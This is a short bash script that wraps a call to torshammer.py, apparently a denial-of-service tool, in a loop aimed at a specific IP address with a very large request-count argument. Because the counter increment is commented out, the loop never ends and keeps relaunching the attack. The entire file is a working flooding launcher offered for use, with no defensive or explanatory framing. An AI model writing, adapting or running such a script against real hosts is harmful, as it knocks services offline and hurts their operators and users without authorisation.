#!/bin/bash
# Basic while loop
counter=1
while [ $counter -le 10 ]
do
#Command
python torshammer.py -t 94.237.72.136 -r 10000000
#((counter++))
done
echo All done
